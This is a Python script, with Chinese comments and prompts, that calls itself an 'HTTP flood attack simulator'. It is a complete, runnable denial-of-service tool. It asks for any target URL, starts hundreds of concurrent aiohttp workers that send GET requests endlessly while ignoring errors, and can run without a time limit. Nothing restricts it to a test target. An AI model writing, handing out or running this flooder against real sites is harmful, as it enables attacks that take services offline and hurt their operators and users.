import asyncio
import time
import os
import aiohttp

# ==============================================================================
# 核心功能模块
# ==============================================================================

def get_user_input(prompt, default_value, value_type=str):
    """
    一个通用的函数，用于获取用户输入，并提供默认值和类型转换。
    """
    while True:
        user_input = input(f"{prompt} (默认为: {default_value}): ").strip()
        if not user_input:
            return default_value
        try:
            return value_type(user_input)
        except ValueError:
            print(f"输入无效，请输入一个有效的 {value_type.__name__} 类型的值。")

async def http_flood_worker(session, url):
    """
    攻击工作单元，在一个异步任务中运行。
    它会持续不断地向目标URL发送GET请求。
    """
    while True:
        try:
            # 使用 aiohttp 发送GET请求。
            # 我们设置一个较短的超时时间，因为我们不关心响应内容，只关心发送请求。
            async with session.get(url, timeout=5) as response:
                # 为了提高效率，我们甚至可以不等待读取响应状态
                pass
        except asyncio.CancelledError:
            # 捕获取消信号，优雅地退出循环
            break
        except Exception:
            # 忽略所有连接错误、超时等异常，继续发送下一个请求
            pass

async def run_http_flood(url, workers, duration):
    """
    主攻击函数，负责创建和管理所有的异步工作单元。
    """
    print(f"正在启动 {workers} 个并发工作单元...")
    
    # 创建一个 aiohttp 客户端会话，所有工作单元共享此会话以提高性能
    async with aiohttp.ClientSession() as session:
        # 创建指定数量的异步任务（工作单元）
        tasks = [asyncio.create_task(http_flood_worker(session, url)) for _ in range(workers)]
        
        # 管理攻击时长
        try:
            if duration > 0:
                print(f"攻击将持续 {duration} 秒... 按 Ctrl+C 可提前终止。")
                await asyncio.sleep(duration)
            else:
                print("攻击已开始，将无限期运行... 按 Ctrl+C 终止。")
                # 使用一个永远不会完成的事件来挂起，直到被中断
                await asyncio.Event().wait()
        except (asyncio.CancelledError, KeyboardInterrupt):
            print("\n检测到中断信号...")
        finally:
            print("正在停止所有工作单元...")
            # 取消所有正在运行的任务
            for task in tasks:
                task.cancel()
            # 等待所有任务确实已经取消
            await asyncio.gather(*tasks, return_exceptions=True)
            print("所有工作单元已停止。")

# ==============================================================================
# 主程序入口
# ==============================================================================

if __name__ == "__main__":
    print("--- HTTP 洪水攻击模拟器 (交互模式) ---")
    print("此工具通过异步IO发送大量HTTP请求，消耗目标的CPU和应用资源。")
    print("-" * 40)

    # 1. 获取用户输入的参数
    target_url = get_user_input("请输入目标URL", "http://target:80")
    # aiohttp 在单进程中非常高效，所以默认并发数可以设得高一些
    worker_count = get_user_input("请输入并发工作单元数 (workers)", 500, int)
    duration = get_user_input("请输入攻击持续时间 (秒, 0为无限)", 60, int)

    print("-" * 40)
    print("攻击参数确认:")
    print(f"  - 目标URL: {target_url}")
    print(f"  - 并发数: {worker_count}")
    print(f"  - 持续时间: {'无限' if duration == 0 else f'{duration} 秒'}")
    print("-" * 40)

    confirm = input("确认开始攻击? (y/n): ").lower()
    if confirm != 'y':
        print("攻击已取消。")
        exit()

    # 2. 启动异步攻击循环
    try:
        asyncio.run(run_http_flood(target_url, worker_count, duration))
    except KeyboardInterrupt:
        # asyncio.run 在接收到 KeyboardInterrupt 时会自动处理清理工作
        print("程序已终止。")
    
    print("攻击模拟结束。")

